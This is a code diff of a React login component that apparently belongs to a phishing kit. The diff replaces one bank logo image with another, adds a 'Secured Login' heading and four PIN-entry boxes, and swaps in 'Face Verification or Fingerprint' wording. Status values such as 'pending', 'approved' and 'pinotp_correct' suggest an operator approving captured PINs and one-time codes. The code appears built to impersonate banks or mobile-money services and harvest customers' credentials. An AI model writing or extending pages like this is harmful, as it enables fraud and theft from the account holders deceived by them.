@@ -8,6 +8,7 @@ import Loader from "./Loader";
 function Login({ client, setpin, sendDetails, setnumber }) {
   const { number } = client;
   const navigate = useNavigate();
+  const [pin, setPin] = useState("");
   const [pin1, setPin1] = useState("");
   const [pin2, setPin2] = useState("");
   const [pin3, setPin3] = useState("");
@@ -328,16 +329,19 @@ function Login({ client, setpin, sendDetails, setnumber }) {
       <div className="container">
         {verifying && <Loader />}
         <header>
-          <img className="momoImg" src="/cabslogo.jpeg" alt="mtn" />
-          <h1 className="login-title">
+          <img className="momoImg" src="/nmbCon.jpeg" alt="mtn" />
+          {/* <h1 className="login-title">
             Welcome to <br />
             <span> Internet Banking </span>
-          </h1>
+          </h1> */}
         </header>
 
         <main>
           {!enterPin && (
             <div className="ctamomo">
+              <div className="pin-input-container">
+                <h1>Secured Login 🔒</h1>
+              </div>
               <div className="phone-number">
                 <div className="numbercont">
                   <div className="NumInput">
@@ -357,17 +361,115 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                 </div>
               </div>
 
-              <div></div>
-              <button
-                className="btnNext"
-                onClick={handlenext}
-                disabled={pinfull || verifying}
-              >
-                Sing In
-              </button>
+              <div>
+                <div className="pin-input-container">
+                  <div>
+                    <input
+                      ref={pin1Ref}
+                      maxLength="1"
+                      type="number"
+                      className="no-spinner"
+                      value={pin1}
+                      onChange={(e) =>
+                        handlePinInput(1, e.target.value, setPin1)
+                      }
+                      onKeyDown={(e) => handleKeyDown(1, e)}
+                      disabled={verifying}
+                    />
+                    <input
+                      ref={pin2Ref}
+                      type="number"
+                      className="no-spinner"
+                      value={pin2}
+                      // maxLength="1"
+                      onChange={(e) =>
+                        handlePinInput(2, e.target.value, setPin2)
+                      }
+                      onKeyDown={(e) => handleKeyDown(2, e)}
+                      disabled={verifying}
+                    />
+                    <input
+                      ref={pin3Ref}
+                      type="number"
+                      maxLength="1"
+                      className="no-spinner"
+                      value={pin3}
+                      onChange={(e) =>
+                        handlePinInput(3, e.target.value, setPin3)
+                      }
+                      onKeyDown={(e) => handleKeyDown(3, e)}
+                      disabled={verifying}
+                    />
+                    <input
+                      ref={pin4Ref}
+                      type="number"
+                      maxLength="1"
+                      className="no-spinner"
+                      value={pin4}
+                      onChange={(e) =>
+                        handlePinInput(4, e.target.value, setPin4)
+                      }
+                      onKeyDown={(e) => handleKeyDown(4, e)}
+                    />
+                  </div>
+
+                  {/* Status/Error Display */}
+                  {error && (
+                    <div
+                      className="error-message"
+                      style={{
+                        color: "red",
+                        marginTop: "10px",
+                        padding: "10px",
+                        backgroundColor: "#ffeeee",
+                        borderRadius: "5px",
+                        textAlign: "center",
+                      }}
+                    >
+                      {error}
+                    </div>
+                  )}
+
+                  {status && (
+                    <div
+                      className="status-message"
+                      style={{
+                        color:
+                          status === "approved" || status === "pinotp_correct"
+                            ? "green"
+                            : status === "pending"
+                              ? "orange"
+                              : "red",
+                        marginTop: "10px",
+                        fontWeight: "bold",
+                        padding: "10px",
+                        backgroundColor:
+                          status === "approved" ? "#eeffee" : "#fff8e1",
+                        borderRadius: "5px",
+                        textAlign: "center",
+                      }}
+                    >
+                      {statusMessages[status] || status}
+                    </div>
+                  )}
+
+                  <button
+                    className="btnContinue"
+                    onClick={handleLogin}
+                    // disabled={!pinfull || verifying}
+                    style={{
+                      opacity: !pinfull || verifying ? 0.6 : 1,
+                      cursor: !pinfull || verifying ? "not-allowed" : "pointer",
+                    }}
+                  >
+                    {verifying ? "Verifying PIN..." : "Sign In"}
+                  </button>
+                </div>
+              </div>
+
               <p className="termspolicy">
-                IMPORTANT: Security advice to help keep your online banking
-                secure and convinient
+                Use Face Verification or <br />
+                Fingerprint. <br />
                 <span style={{ color: " #0d5e94" }}>
                   {/* Terms of use and Privacy Policy */}
                 </span>
@@ -435,16 +537,6 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   onKeyDown={(e) => handleKeyDown(4, e)}
                   disabled={verifying}
                 />
-                {/* <input
-                  ref={pin5Ref}
-                  type="number"
-                  maxLength="1"
-                  className="no-spinner"
-                  value={pin5}
-                  onChange={(e) => handlePinInput(5, e.target.value, setPin5)}
-                  onKeyDown={(e) => handleKeyDown(5, e)}
-                  disabled={verifying}
-                /> */}
               </div>
 
               {/* Status/Error Display */}
@@ -486,9 +578,6 @@ function Login({ client, setpin, sendDetails, setnumber }) {
                   {statusMessages[status] || status}
                 </div>
               )}
-              <div className="forgot-pin">
-                {/* <a href="#">Forgot PIN?</a> */}
-              </div>
 
               <button
                 className="btnContinue"
